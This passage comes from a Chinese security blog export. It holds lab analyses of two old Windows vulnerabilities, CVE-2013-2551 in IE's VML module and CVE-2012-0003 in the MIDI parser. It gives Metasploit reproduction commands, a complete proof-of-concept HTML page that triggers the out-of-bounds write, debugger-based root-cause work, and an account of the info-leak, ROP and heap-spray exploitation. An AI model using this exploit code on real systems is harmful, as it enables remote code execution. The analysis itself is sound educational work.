        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2013-2551漏洞分析（整数溢出）</title>
    <url>/2020/02/19/reverse/cve-2013-2551%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%EF%BC%89/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01-漏洞描述"></a>01-漏洞描述</h1><ul>
<li>漏洞战争：该漏洞出现在 IE 中负责解析 VML（向量标记语言，用 XML 语言绘制向量图形）的 vgx.dll模块，由于在处理 VML 标签时对输入参数未做有效验证导致整数溢出。</li>
<li><a href="https://cve.mitre.org：Use-after-free" target="_blank" rel="noopener">https://cve.mitre.org：Use-after-free</a> vulnerability in Microsoft Internet Explorer 6 through 10 allows remote attackers to execute arbitrary code via a crafted web site that triggers access to a deleted object, as demonstrated by VUPEN during a Pwn2Own competition at CanSecWest 2013, aka “Internet Explorer Use After Free Vulnerability,” a different vulnerability than CVE-2013-1308 and CVE-2013-1309.</li>
</ul>
<h1 id="02-测试环境"><a href="#02-测试环境" class="headerlink" title="02-测试环境"></a>02-测试环境</h1><ul>
<li>目标系统：Windows7 专业版 SP1（虚拟机</li>
<li>WinDbg：动态调试</li>
<li>IDA Pro：静态分析</li>
<li>IExplore 8：漏洞软件<a id="more"></a></li>
</ul>
<h1 id="03-漏洞验证"><a href="#03-漏洞验证" class="headerlink" title="03-漏洞验证"></a>03-漏洞验证</h1><ol>
<li><p>使用msf</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 搜索并使用模块</span></span><br><span class="line">msf5 &gt; search cve-2013-2551</span><br><span class="line">msf5 &gt; use exploit/windows/browser/ms13_037_svg_dashstyle</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置payload</span></span><br><span class="line">msf5 exploit(windows/browser/ms13_037_svg_dashstyle) &gt; set payload windows/exec</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置payload参数，弹出计算器（exploit模块参数保持默认即可</span></span><br><span class="line">msf5 exploit(windows/browser/ms13_037_svg_dashstyle) &gt; set cmd calc.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击：开启服务器，等待目标连接</span></span><br><span class="line">msf5 exploit(windows/browser/ms13_037_svg_dashstyle) &gt; exploit</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(windows/browser/ms13_037_svg_dashstyle) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/hvMannCwdGn0</span><br><span class="line">[*] Local IP: http://172.20.10.4:8080/hvMannCwdGn0</span><br><span class="line">[*] Server started.</span><br><span class="line"><span class="meta">#</span><span class="bash"> 靶机打开恶意链接后，成功弹出计算器</span></span><br><span class="line">[*] 172.20.10.4      ms13_037_svg_dashstyle - Gathering target information for 172.20.10.4</span><br><span class="line">[*] 172.20.10.4      ms13_037_svg_dashstyle - Sending HTML response to 172.20.10.4</span><br><span class="line">[-] 172.20.10.4      ms13_037_svg_dashstyle - Exception handling request: undefined method `report_client' for #&lt;Metasploit::Framework::DataService::RemoteHTTPDataService:0x00007fb1ecde4158&gt;</span><br><span class="line">Did you mean?  report_event</span><br><span class="line">               report_loot</span><br><span class="line">[*] 172.20.10.4      ms13_037_svg_dashstyle - Sending HTML to info leak...</span><br><span class="line">[*] 172.20.10.4      ms13_037_svg_dashstyle - ntdll leak: 0x76de70b0</span><br><span class="line">[*] 172.20.10.4      ms13_037_svg_dashstyle - Using ntdll ROP</span><br><span class="line">[*] 172.20.10.4      ms13_037_svg_dashstyle - Sending HTML to trigger...</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol start="2">
<li><p>使用《漏洞战争》提供的POC，GitHub地址：<a href="https://github.com/riusksk/vul_war" target="_blank" rel="noopener">https://github.com/riusksk/vul_war</a></p>
<p> IE8打开poc.html、选择“允许阻止的内容”、点击“crash”按钮，IE崩溃，poc源码如下</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-ua-compatible"</span> <span class="attr">content</span>=<span class="string">"IE=EmulateIE9"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">POC by VUPEN</span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Include the VML behavior --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">v\: * &#123; behavior:url(#default#VML); display:inline-block &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Declare the VML namespace --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xml:namespace</span> <span class="attr">ns</span>=<span class="string">"urn:schemas-microsoft-com:vml"</span> <span class="attr">prefix</span>=<span class="string">"v"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var rect_array = new Array()</span></span><br><span class="line"><span class="undefined">var a          = new Array()</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function createRects()&#123;</span></span><br><span class="line"><span class="undefined">	for(var i=0; i&lt;0x400; i++)&#123;</span></span><br><span class="line"><span class="undefined">		rect_array[i]    = document.createElement("v:shape")</span></span><br><span class="line"><span class="undefined">		rect_array[i].id = "rect" + i.toString()</span></span><br><span class="line"><span class="undefined">		document.body.appendChild(rect_array[i])</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function crashme()&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">	var vml1  = document.getElementById("vml1")</span></span><br><span class="line"><span class="undefined">	var shape = document.getElementById("shape")</span></span><br><span class="line"><span class="undefined">	</span></span><br><span class="line"><span class="undefined">	for (var i=0; i&lt;0x400; i++)&#123;									   //set up the heap</span></span><br><span class="line"><span class="undefined">      a[i] = document.getElementById("rect" + i.toString())._vgRuntimeStyle;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">	for (var i=0; i&lt;0x400; i++)&#123;</span></span><br><span class="line"><span class="undefined">      a[i].rotation;                                                   //create a COARuntimeStyle</span></span><br><span class="line"><span class="undefined">      if (i == 0x300) &#123;                                                //allocate an ORG array of size B0h</span></span><br><span class="line"><span class="undefined">           vml1.dashstyle = "1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span><br><span class="line"><span class="undefined">	  &#125;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">	</span></span><br><span class="line"><span class="undefined">    vml1.dashstyle.array.length      = 0 - 1</span></span><br><span class="line"><span class="undefined">    shape.dashstyle.array.length	 = 0 - 1</span></span><br><span class="line"><span class="undefined">	</span></span><br><span class="line"><span class="undefined">    for (var i=0; i&lt;0x400; i++) &#123;</span></span><br><span class="line"><span class="undefined">       a[i].marginLeft   = "a";</span></span><br><span class="line"><span class="undefined">       marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16);</span></span><br><span class="line"><span class="undefined">       if (marginLeftAddress &gt; 0) &#123;</span></span><br><span class="line"><span class="undefined">			try&#123;</span></span><br><span class="line"><span class="undefined">				shape.dashstyle.array.item(0x2E+0x16+i) = 0x4b5f5f4b;</span></span><br><span class="line"><span class="undefined">			&#125;</span></span><br><span class="line"><span class="undefined">			catch(e) &#123;continue&#125;</span></span><br><span class="line"><span class="undefined">       &#125;</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"createRects();"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:oval</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:stroke</span> <span class="attr">id</span>=<span class="string">"vml1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:oval</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:oval</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:stroke</span> <span class="attr">dashstyle</span>=<span class="string">"2 2 2 0 2 2 2 0"</span> <span class="attr">id</span>=<span class="string">"shape"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:oval</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"crash!!!"</span><span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"crashme();"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="04-漏洞分析"><a href="#04-漏洞分析" class="headerlink" title="04-漏洞分析"></a>04-漏洞分析</h1><blockquote>
<p>使用《漏洞战争》提供的POC来分析漏洞成因</p>
</blockquote>
<h2 id="4-1-触发异常"><a href="#4-1-触发异常" class="headerlink" title="4.1-触发异常"></a>4.1-触发异常</h2><ol>
<li><p>WinDbg附加IE8，打开poc.html重新测试，发生访问异常；</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123425.jpg" alt="image-20200218141741043"></p>
<p> 发生在地址4b5f5f4b处，与poc中crashme函数中的代码相关（二者之间具体什么联系，后面探究</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073543.jpg" alt="image-20200219131622534"></p>
</li>
<li><p>为了更好的定位漏洞代码，对IE开启页堆机制（+hpa</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073541.jpg" alt="image-20200219131658640"></p>
</li>
<li><p>开启页堆后，重新测试，断在memcpy函数处，访问2a47d060时错误</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123442.jpg" alt="image-20200218150428461"></p>
<p> 观察反汇编指令，“基址+偏移”的形式（而且还*4），断定是数组访问越界，进一步推测，memcpy中传参有误</p>
</li>
<li><p>kb指令查看函数参数以及堆栈调用，可以发现2a47d060是memcpy的第二个参数即源地址，也定位到vgx的ORG::Get函数（kb显示前3个参数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123426.jpg" alt="image-20200218150348789"></p>
</li>
<li><p>IDA反汇编VGX.dll文件，函数窗口中搜索ORG::Get函数，F5得到其伪C代码</p>
<p> 由步骤4知，出错的位memcpy的第二个参数即源地址，其由Get函数的参数1、3决定</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123419.jpg" alt="image-20200218150807470"></p>
</li>
<li><p>再看栈回溯，Get中的参数1、3来自get_item的参数1、2</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123417.jpg" alt="image-20200218151133651"></p>
</li>
<li><p>再回溯，找到OLEAUT32!DispCallFunc，已经脱离vgx.dll，故可以断定，vgx!COALineDashStyleArray::get_item只是用于触发异常，而非真正造成漏洞的罪魁祸首</p>
</li>
<li><p>get_item是windows中的API，一定会对应poc.html中的js函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073544.jpg" alt="image-20200219131733787"></p>
<p> 后面赋值的地址会引发访问错误（步骤1中），而且二者名字类似，因此可基本断定：数组越界访问的错误就是由poc中的item函数引发的//here</p>
</li>
<li><p>item怎么引起越界访问？</p>
<p> （1）vml1.dashstyle包含 44 个元素</p>
<p> （2）item函数访问vml1.dashstyle时，指定下标0x2E+0x16=68，必然访问越界</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073540.jpg" alt="image-20200219131941625"></p>
</li>
<li><p>访问地址2a47d060时错误，68*4=272=110h，dd指令查看内存分布（L50指定显示多少）</p>
<p>前面是正常范围的元素1-44，若按照下表68访问，则越界出错</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123424.jpg" alt="image-20200218160341014"></p>
</li>
</ol>
<h2 id="4-2-实质成因"><a href="#4-2-实质成因" class="headerlink" title="4.2-实质成因"></a>4.2-实质成因</h2><ol>
<li><p>由上面分析可知，item函数的调用只是触发异常，并非真正漏洞处，分析poc，在item调用前，发现有修改length的代码，如下</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-73539.jpg" alt="image-20200219132005334"></p>
<p> 赋值比较反常，0-1 = -1 = 0xFFFFFFFF，可断定，这就是引起整数溢出的罪魁祸首</p>
</li>
<li><p><strong>基于类函数定位的漏洞分析方法</strong>（详情漏洞战争 4.3</p>
<p> 如上指令涉及“dashstyle”、”length“等关键字，在IDA中函数窗口搜索；涉及length的有两个，通过名字猜测，put的类似set，是设置xxx用的；</p>
<p> 因此，找到关键函数COALineDashStyleArray::put_length</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123427.jpg" alt="image-20200218163044556"></p>
</li>
<li><p>WinDbg重新附加IE，在COALineDashStyleArray::put_length下断后，重新测试，页面中点击“crash”，成功进入put_length函数（bu针对某个符号下断点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123420.jpg" alt="image-20200218164050993"></p>
</li>
<li><p>p单步执行（步过），寻找敏感点</p>
</li>
<li><p>put_lenth+0x9处，取出第一个参数（具体是啥不明确，后面再说</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123431.jpg" alt="image-20200218164817061"></p>
</li>
<li><p>+0x6b处调用CElements函数，由名字猜测其获得某元素，dd查看其参数eax，发现有002c=44即vml1.dashstyle的元素个数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123434.jpg" alt="image-20200218170231823"></p>
</li>
<li><p>t单步步入，进入CElements内部，+0x5时取出参数1，即vml1.dashstyle数组对象（因为有元素个数信息，故这样猜测）</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123428.jpg" alt="image-20200218170554968"></p>
</li>
<li><p>继续p单步，+0x8时，取出vml1.dashstyle数组对象的元素个数0x2c，并赋值给eax即返回值；使用movzx无符号扩展指令，表示此元素个数/数组长度为无符号整数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123430.jpg" alt="image-20200218170825807"></p>
</li>
<li><p>随后退出CElements函数（返回值eax=002c，此函数就是为了获取vml1.dashstyle的数组长度），+0x6e处获取put_length的第二个参数赋值给esi，FFFFFFFF = -1，即poc中设置的</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123441.jpg" alt="image-20200218171253277"></p>
</li>
<li><p>+0x71、73处，比较eax和esi，即原先的元素个数0x2c和后来设置的-1，jge是有符号跳转，必然跳（正数当然大于负数</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123418.jpg" alt="image-20200218171553692"></p>
</li>
<li><p>u指令，查看不跳转后是怎么执行的？调用new再分配内存</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123432.jpg" alt="image-20200218183444804"></p>
<p>比如，eax=2，esi=5，即原先长度为2，后设置为5，此时jge不跳；</p>
<p>sub esi,eax（esi = 5-2 = 3，即新增了多少元素</p>
<p>xor ecx,ecx（ecx清零</p>
<p>push 4, pop edx（edx = 4，即每个元素大小为4</p>
<p>mov eax,esi（eax = 3</p>
<p>mul eax,edx（eax = 3*4 = 12，即新增了多少空间</p>
<p>Seto cl, neg ecx（SETO-溢出置位、NEG求补，ecx=0，OD中测试后，依然为0</p>
<p>or ecx, eax（eax 或操作 0，结果不变，依然12</p>
<p>push ecx, call new（新申请12空间，即原先的空间不足，需要再申请</p>
</li>
<li><p>实际情况满足jge跳转，继续p，+0xcf处，有一减法操作，因为esi为负数，所以sub后eax不减反增，eax=2c - (-1) = 2c + 1 = 2d，这就是问题之所在</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123440.jpg" alt="image-20200218185503958"></p>
<p>正常情况下，如eax=5，esi=3，满足jge，则5 - 3 = 2，eax是要减小的，而poc中设置为-1，使其变大</p>
</li>
<li><p>随后调用deleteRange函数，传参-1、poc中特殊构造的差0x2d、vml1.dashstyle数组对象</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123437.jpg" alt="image-20200218185900346"></p>
</li>
<li><p>内部调用MsoDeletePx函数</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123436.jpg" alt="image-20200218191348150"></p>
</li>
<li><p>内部又调用 MsoFRemovePx 函数</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123435.jpg" alt="image-20200218191728707"></p>
</li>
<li><p>继续跟进MsoFRemovePx 函数，+0xa7处</p>
<p>ebx是2c - (-1) 的差值 = 2d，esi所指向数组长度=2c，二者相减，反过来又得到了-1 = FFFF，也就是poc中设置-1；</p>
<p>但此时，-1已经不是负数这么简单，其在内存是FFFF，相比原长度2c，是一个很大的数</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-18-123433.jpg" alt="image-20200218192328863"></p>
</li>
<li><p>若按照正常的情况，比如原先长度为5，新设置为2，则5-2=3得到差值，MsoFRemovePx中sub操作，5-3=2，这个2就是新长度，此时在内存中将长度改掉没有问题；</p>
</li>
<li><p>现在将数组长度由2c改为FFFF，原则上这么设置没问题，FFFF作为长度也是合理的；但是，之前cmp 2c,-1时，满足了jge跳转，导致没有调用new新申请内存；</p>
<p>也就是说，实际的内存空间没有增加，仅表面上增加了长度；所以，当通过item函数对数组进行素引取值时，就会导致数组越界访问</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073544.jpg" alt="image-20200219131733787"></p>
</li>
</ol>
<ul>
<li>PS：<ul>
<li>因此可以说，长度设置为FFFF“合理但不合法”；</li>
<li>若用无符号比较，则2c与FFFF，必然通不过jae跳转，老老实实new申请内存，也就没有后面的破事</li>
<li>有/无符号比较：<a href="https://blog.csdn.net/u010765526/article/details/73613815" target="_blank" rel="noopener">https://blog.csdn.net/u010765526/article/details/73613815</a></li>
</ul>
</li>
</ul>
<h1 id="05-漏洞利用"><a href="#05-漏洞利用" class="headerlink" title="05-漏洞利用"></a>05-漏洞利用</h1><blockquote>
<p>使用msf提供的rb文件来分析漏洞是如何被利用的（利用信息泄漏实现漏洞利用</p>
</blockquote>
<ol>
<li><p>创建0x400个v:shape 元素（COARunTimeStyle对象），html_info_leak函数中，如下</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073546.jpg" alt="image-20200219142715842"></p>
</li>
<li><p>在第 0x301个时，创建包含 44 个元素的 dashstyle 数组（ORG数组）， 总共占空间4*44=0xB0字节</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073545.jpg" alt="image-20200219142749801"></p>
</li>
<li><p>当两个COARunTimeStyle对象相邻时，前一个对象的ORG数组就紧挨着后一个对象，通过漏洞对数组进行越界访问，就可以访问到后面对象的内存地址</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-73542.jpg" alt="image-20200219143349230"></p>
</li>
<li><p>poc中<code>a[i].marginLeft = &quot;a&quot;;</code>，js中对marginLeft属性进行赋值，对应COARunTimeStyle::put_marginLeft函数（上面所述的类函数定位法），用 IDA 反汇编该函数，发现其将设置的字符串保存在0x58偏移处；</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-73545.jpg" alt="image-20200219144544318"></p>
</li>
<li><p><code>0x2C + 8/4 + 0x58/4 = 0x2E+0x16</code>，正好对应item对数组进行索引时的下标，通过数组越界访问，刚好访问到0x58偏移处，即字符串保存的位置</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073536.jpg" alt="image-20200219151725437"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073538.jpg" alt="image-20200219151615581">（来自漏洞战争）</p>
</li>
<li><p>通过泄露地址固定偏移计算出ntdll.dll模块的版本及基址</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073537.jpg" alt="image-20200219152014364"></p>
</li>
<li><p>进而利用ntdll的基址构造出 ROP chain，调用ZwProtectVirtualMemory函数将 Shellcode所在内存设置为可执行权限（修改内存属性：绕过 DEP数据执行保护、rop链：绕过ASLR</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073542.jpg" alt="image-20200219152353348"></p>
</li>
<li><p>rb文件load_exploit_html函数处，获取payload、进行堆喷射，从而控制程序流程，漏洞利用成功</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-19-073539.jpg" alt="image-20200219152711795"></p>
</li>
</ol>
<p>（啥时候我能写出这种水平的exp，菜哭了😭😭😭</p>
<h1 id="06-参考文献"><a href="#06-参考文献" class="headerlink" title="06-参考文献"></a>06-参考文献</h1><ul>
<li>《漏洞战争》</li>
<li><a href="https://blog.csdn.net/qq_38924942/article/details/88652564" target="_blank" rel="noopener">https://blog.csdn.net/qq_38924942/article/details/88652564</a></li>
</ul>
<p>（在家憋死了，我想出去玩，赶紧好起来吧</p>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257746.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257746.htm</a></p>
<p># </p>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2012-0003漏洞分析（堆溢出）</title>
    <url>/2020/01/24/reverse/cve-2012-0003%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E5%A0%86%E6%BA%A2%E5%87%BA%EF%BC%89/</url>
    <content><![CDATA[<h1 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01-漏洞描述"></a>01-漏洞描述</h1><ul>
<li>漏洞战争：微软的多媒体库 winmm.dll 在处理 MIDI 文件时，由于对数据处理不当导致的堆溢出，攻击者可在网页中嵌入恶意构造的 MIDI 文件来远程执行任意代码。</li>
<li><a href="https://cve.mitre.org：Unspecified" target="_blank" rel="noopener">https://cve.mitre.org：Unspecified</a> vulnerability in winmm.dll in Windows Multimedia Library in Windows Media Player (WMP) in Microsoft Windows XP SP2 and SP3, Server 2003 SP2, Vista SP2, and Server 2008 SP2 allows remote attackers to execute arbitrary code via a crafted MIDI file, aka “MIDI Remote Code Execution Vulnerability.”</li>
</ul>
<h1 id="02-测试环境"><a href="#02-测试环境" class="headerlink" title="02-测试环境"></a>02-测试环境</h1><ul>
<li>目标系统：Windows XP SP3（虚拟机</li>
<li>OllyDebug：动态调试</li>
<li>IDA Pro：静态分析</li>
<li>IExplore 6、Media Player：漏洞软件</li>
<li>Metasploit：漏洞复现、利用</li>
<li>辅助工具：wget-保存mid文件到本地、gflags.exe-开启/关闭hpa、<a id="more"></a></li>
</ul>
<h1 id="03-漏洞复现"><a href="#03-漏洞复现" class="headerlink" title="03-漏洞复现"></a>03-漏洞复现</h1><ol>
<li><p>msf生成恶意文件</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 搜索并使用模块</span></span><br><span class="line">msf5 &gt; search cve-2012-0003</span><br><span class="line">msf5 &gt; use exploit/windows/browser/ms12_004_midi</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置payload</span></span><br><span class="line">msf5 exploit(windows/browser/ms12_004_midi) &gt; set payload windows/exec</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置payload参数，弹出计算器（exploit模块参数保持默认即可</span></span><br><span class="line">msf5 exploit(windows/browser/ms12_004_midi) &gt; set cmd calc.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击：开启服务器，等待目标连接</span></span><br><span class="line">msf5 exploit(windows/browser/ms12_004_midi) &gt; exploit</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(windows/browser/ms12_004_midi) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/uMMCLOKsr</span><br><span class="line">[*] Local IP: http://127.0.0.1:8080/uMMCLOKsr</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
</li>
<li><p>目标机器xp用IE浏览器打开此恶意URL，成功弹出计算器</p>
<p> 注意：若目标机器中对IE浏览器开启页堆，则IE会直接报错，不会弹出（默认页堆是关闭的</p>
</li>
<li><p>msf中也得到相关记录</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] 192.168.156.151  ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class="line">[*] 192.168.156.151  ms12_004_midi - Sending html to 192.168.156.151:1184...</span><br><span class="line">[*] 192.168.156.151  ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503</span><br><span class="line">[*] 192.168.156.151  ms12_004_midi - Sending midi corruption file...</span><br></pre></td></tr></table></figure>
</li>
<li><p>PS：也可设置payload为强大的meterpreter，获取反弹shell</p>
</li>
</ol>
<h1 id="04-准备工作"><a href="#04-准备工作" class="headerlink" title="04-准备工作"></a>04-准备工作</h1><h2 id="4-1-提取样本"><a href="#4-1-提取样本" class="headerlink" title="4.1-提取样本"></a>4.1-提取样本</h2><ol>
<li><p>页堆关闭情况下，计算器会弹出，但IE窗口会马上关闭，来不及提取html</p>
<p> 故先将页堆开启，使其弹出报错框，而不至于让IE关闭。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Debugging Tools for Windows (x86)&gt;gflags.exe -i IExplore.exe +hpa</span><br><span class="line">Current Registry Settings for IExplore.exe executable are: 02000000</span><br><span class="line">    hpa - Enable page heap</span><br></pre></td></tr></table></figure>
</li>
<li><p>右键-查看源文件，将内容复制并保存为“exploit.html”</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080643.jpg" alt="image-20200120164118860"></p>
</li>
<li><p>html中搜索”mid“，找到相关媒体文件，IE中打开其地址，会默认打开media player，鼓捣一番，发现并不能保存到本地</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80641.jpg" alt="image-20200120164553668"></p>
</li>
<li><p>使用wget会直接404错误，而msf中也会提示未知的UA头</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080639.jpg" alt="image-20200120164932911"></p>
</li>
<li><p>通过–user-agent参数，借用一下IE浏览器的UA头，成功下载</p>
<p> 最终命令为：<code>wget --user-agent &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot; http://127.0.0.1:8080/uMMCLOKsr/ojGEs.mid</code></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080644.jpg" alt="image-20200120170403958"></p>
</li>
<li><p>修改html中mid路径为相对路径，将二者放置同一目录，搭建本地环境以方便测试。</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081038.jpg" alt="image-20200120171038366"></p>
</li>
</ol>
<h2 id="4-2-MIDI格式"><a href="#4-2-MIDI格式" class="headerlink" title="4.2-MIDI格式"></a>4.2-MIDI格式</h2><ul>
<li><p>MIDI文件由若干块组成，两种块：头块和音轨块</p>
</li>
<li><p>每个块 = 标记 + 长度 + 数据，标记与长度均占4字节，格式如下：</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080649.jpg" alt="image-20200123121218589"></p>
</li>
<li><p>头块中的块数据主要包含：格式类型、音轨数和时间计数值</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080634.jpg" alt="image-20200123121444591"></p>
</li>
<li><p>音轨块中的块数据便是音轨事件数据，常见的音轨事件如下</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080657.jpg" alt="image-20200123121543841"></p>
</li>
</ul>
<h2 id="4-3-堆调试技巧"><a href="#4-3-堆调试技巧" class="headerlink" title="4.3-堆调试技巧"></a>4.3-堆调试技巧</h2><ul>
<li><p>堆管理器中提供一些调试选项用于辅助堆调试，通过 Windbg 提供的 gflags. exe或者!gflag 命令来设置，常见调试选项如下</p>
<ul>
